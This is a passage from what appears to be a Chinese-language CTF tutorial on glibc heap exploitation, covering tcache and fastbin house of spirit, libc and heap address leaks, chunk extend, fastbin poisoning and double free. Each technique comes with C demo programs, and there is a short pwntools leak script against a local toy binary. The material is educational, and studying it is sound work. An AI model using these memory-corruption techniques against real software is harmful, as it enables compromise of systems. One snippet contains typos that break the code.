class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 初始化堆环境</span><br>    <br>    <span class="hljs-comment">// 伪造假堆块，试图释放后再次分配得到该地址的堆块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, fck+<span class="hljs-number">2</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span class="hljs-built_in">free</span>(fck+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheHouseOfSpirit.png"></p><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>在做堆题时，经常会遇到保护全开的情况，特别是地址随机化保护PIE，或者题目本身没有明显可利用的打印函数，这时就需要采取一些机制来泄露出libc地址或者堆地址等。</p><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露 libc 利用的就是 bin 中双向链表的性质，当一个堆块被加入链表时，它的 fd 和 bk 指针会指向 libc 中的地址。在“绕过 tcache”中我们就是利用了这个特性来泄露的 libc 地址。</p><p>还有更加直接的方法，只需要让分配和释放的chunk 大于等于 0x410字节（超过 tcache 的范围）即可。需要注意的是，这时我们需要防止释放的堆块和 top chunk 合并。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块合并</span><br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放的堆块进入 unsorted bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachelibc.png"></p><h5 id="泄露-heap-地址"><a href="#泄露-heap-地址" class="headerlink" title="泄露 heap 地址"></a>泄露 heap 地址</h5><p>除了泄露 libc 地址，我们还可以泄露 heap 地址。在泄露堆地址以后，我们确定好目标地址的偏移，再通过修改 tcache bin 的 fd 指针，就可以在下次分配时分配到我们想要的堆块。</p><blockquote><p>在 libc-2.28 中，增加了对 tcache 二次释放的检查，所以此种攻击方法在 libc-2.28 及其更高版本中失效</p></blockquote><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free !!</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %p\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>double free 错误提示了，换了三个版本的 Libc 都木有用，先放着碰到题目再说🫥</p></blockquote><p>还有另一种方法，我们利用 malloc 不会清除内存空间的特性以及 printf 格式化字符串遇到字符 “\x00” 才会停止的特性去泄露 heap base 。</p><p>题目示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    read(<span class="hljs-number">0</span>, p3, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, p3);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(info)<br>info = u64(info.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = info &amp; <span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap base: &quot;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheheap_exp.png"></p><h5 id="利用-tcache-bin-记录堆块泄露地址"><a href="#利用-tcache-bin-记录堆块泄露地址" class="headerlink" title="利用 tcache bin 记录堆块泄露地址"></a>利用 tcache bin 记录堆块泄露地址</h5><p>有的时候题目会限制free的次数，我们无法通过多次释放来填满 tcache bin 。这种情况我们就可以结合 tcache bin 的特性。我们知道，在初始化堆的时候， tcache bin 会生成一块 0x250 大小的堆块来记录属于 tcache bin 大小的堆块信息。我们修改这里的记录，就可以把后续释放的堆块放进 unsorted bin 中。</p><p>方法一：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br><br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><br>    <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-comment">// malloc 3 ==&gt; tcache bin count = -1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码中，我们通过利用 double free 让一个堆块自身构成循环，然后 malloc 3次后就可以让 tcache bin 的记录变为 -1，由于 libc 源代码是认定为无符号整型所以此时也就是一个非常大的数，自然也就认为该 tcache bin 是被填满了的。最后再 free 相同大小的堆块，就会被释放到相应的bin中。<br>方法二：</p><p>直接修改记录信息。利用double free泄露出heap地址，计算偏移并求出记录该tcache bin的地址，然后利用tcache bin poison将堆块分配到这里进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;srdlb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br>    <br>    ptr = malooc(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    ptr[<span class="hljs-number">-74</span>]=<span class="hljs-number">0x0700000000000000</span>;    <span class="hljs-comment">//这里是我们自己计算出的偏移</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码中我们将记录块修改为0x07这样就会被认为是已经填满了七块堆块，下一个 free 掉的堆块就会进入相应的区域。</p><h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>其实就是我们可以通过释放堆块后对其数据进行修改。其中由于tcache机制的加入使得漏洞利用更简单。chunk extend 也更加的轻松，只需要修改当前chunk的size，我们free再malloc后就可以获得对应大小的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-number">0xa1</span>;<br>    <span class="hljs-built_in">free</span>(p1);<br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_extend2.png"></p><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><blockquote><p>这一部分我的环境是 ubuntu16 libc2.23</p></blockquote><p>简单回顾一下 fast bin 的特性：</p><ul><li>属于fast bin 的 chunk 大小在 64 位下是 0x20-0x80，每一条 bin 链表以 0x10 递增，共计七条链；32 位是 0x10-0x40 ，以 0x8 递增。</li><li>fast bin 是单链表且先进后出，就是说在 fast bin 中只有 fd 指针会被使用。</li><li>属于 fast bin 的 chunk 被释放时不会被 unlink ，不会和堆块进行合并，即使紧邻 Top chunk。</li></ul><h3 id="fast-bin-posioning"><a href="#fast-bin-posioning" class="headerlink" title="fast bin posioning"></a>fast bin posioning</h3><blockquote><p>其实和之前 tcache 的方法是一样的，只不过我们现在的环境是 libc2.23 没有 tcache😊</p></blockquote><p>这种攻击方法的目的就是将堆块分配到我们想要控制的内存区域，再通过题目所给的编辑堆块的功能来修改这一部分的内存区域。</p><p>实现攻击目标，首先要在目标区域为造出一个堆块，将伪造堆块的size大小设置为要申请的chunk大小+0x10，然后将伪造堆块的地址填入对应大小的bin链中，之后正常申请堆块即可。</p><p>大致原理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack addr is %p\n&quot;</span>, fck);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;           <br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;  <span class="hljs-comment">//把fck指针写入fd指针</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the original heap %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to the stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp.png"></p><p>如上代码，我们修改了 fd 指针，使得 fd 指针指向了 ptr[0]。这样我们再次分配大小为 0x10 的堆块时，会从被修改的 fd 指针指向的地址处获取堆块，并返回给我们。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp_gdb1.png"></p><blockquote><p>因为我们写入到 fd 指针的是 fck 的地址，也就是伪造堆块的头地址，而 malloc 返回的是用户数据地址，所以两个地址相差0x10</p></blockquote><h3 id="fast-bin-house-of-spirit"><a href="#fast-bin-house-of-spirit" class="headerlink" title="fast bin house of spirit"></a>fast bin house of spirit</h3><p>House of Spirit 这种技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>我们需要注意的是，系统对 chunk 会有相应的检查，我们需要绕过检查。相关数据如下：</p><ul><li><p>fake chunk 的 IS_MAPPED 不能为 1</p><p>这个标志位位于size低二比特位。标志位是 1 代表堆块由 mmap 分配，而 mmap 分配的堆块不进入 fast bin 管理。</p></li><li><p>地址对齐</p><p>比如32位程序的话fake_chunk的prev_size所在地址就应该位 <code>0xXXXX0</code> 或 <code>0xXXXX4</code>。64位的话地址就应该在 <code>0xXXXX0</code> 或 <code>0xXXXX8</code> 。</p></li><li><p>大小对齐</p><p>需要满足 fsat bin 的尺寸要求，大小不能大于0x80。</p></li><li><p>next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem</p><p>最大不能超过 av-&gt;system_mem ，即 128kb。next_chunk 的大小一般我们会设置成为一个超过 fast bin 最大的范围的一个数，但要小于 128kb，这样做的目的是在 chunk 连续释放的时候，能够保证伪造的 chunk 在释放后能够挂在 fast bin 中 main_arena 的前面，这样以来我们再一次申请伪造 chunk 大小的块时可以直接重启伪造 chunk。</p></li><li><p>不能构成 double free 的情况</p><p>fake_chunk前一个释放块不能是fake_chunk本身，如果是的话_int_free函数就会检查出来并且中断</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">6</span>] __attribute__ ((aligned(<span class="hljs-number">16</span>)));    <span class="hljs-comment">//对齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>,fck);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//该 chunk 的大小</span><br>    fck[<span class="hljs-number">5</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//下一个 chunk 的大小</span><br>    <span class="hljs-built_in">free</span> (&amp;fck[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new malloc addr is %p\n&quot;</span>,<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse.png"></p><p>我们在 gdb 里面走一遍</p><p>首先分配 fake chunk ，我们查看该地址的内存信息（我编译的时候开了保护所以每一次运行的地址不一样）</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb1.png"></p><p>在执行完赋值操作以后就变成了这样</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb2.png"></p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>所谓 double free 就是同一个堆被分配两次，其实不仅仅是两次也可以是多次，也就是说被释放的 chunk 在 fast bin 中出现多次。这样之后我们可以从 fast bin 链表中取出同一个堆块，结合堆块的数据内容可以实现类似于类型混淆的效果啦。 同样，因为两次释放的同一个堆块会将指针指向自己，所以我们也可以用来泄露 heap 的地址。</p><p>double free 能够成功的原因主要有两部分：</p><ul><li>fast bin 的堆块被释放以后 next_chunk 的 prev_inuse 位不会被清空</li><li>fast bin 在执行 free 的时候仅仅验证了 main_area 直接指向的块，即链表指针头部的块。</li></ul><p>演示说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr2 addr is %p\n&quot;</span>, ptr2);<br><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    <span class="hljs-comment">// leak heap addr</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ptr2 head addr is %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// alloc to stack</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;  <span class="hljs-comment">// modify chunk size</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble.png"></p><p>我们分别在每一次的 free 和 malloc 处下断点，gdb 中的流程如下：</p><p>第一次 free ptr1，ptr1的地址进入 fast bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble1.png"></p><p>第一次 free ptr2，ptr2 的地址进入 fast bin ，此时 ptr1 的 fd 指针指向 ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble2.png"></p><p>第二次 free ptr1，此时 ptr2 的 fd 指针指向 ptr1，ptr1 的 fd 指针仍然指向 ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble3.png"></p><p>第一次 malloc，最后进的 ptr1 被分配出去</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble4.png"></p><p>第二次 malloc， ptr2 被分配出去，但因为因为 ptr2 的 fd 指针指向 ptr1，所以系统仍然认为 ptr1 在 fast bin 中，位置在 ptr2之后（这个图是我们对 ptr1进行了一些 fd 混淆的操作之后截的所以 ptr1 的指针指向 stack）</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble5.png"></p><p>第三次malloc就会把 ” 系统以为仍然在fast bin 里 “ 的 ptr1分配出去。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble6.png"></p><p>最后再一次malloc，就会把我们改写后的地址分配给堆啦</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble7.png"></p><h1 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h1><p>简单回顾一下 unsortedbin 的基本来源和使用情况：</p><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个比较大的 chunk 被分为两个部分之后，如果剩下的部分大于 minsize ，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk ，并且这个 chunk 不和 top chunk 紧邻，这个 chunk 就会被放进 unsorted bin 中</li><li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li></ul><h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><p>unsorted bin 采用 FIFO，即先进后出的顺序释放，也就是说从 unsortedbin 中取堆块的时候是从尾部取所以 unsorted bin 使用 bk 指针遍历堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块并入Top chunk中</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span 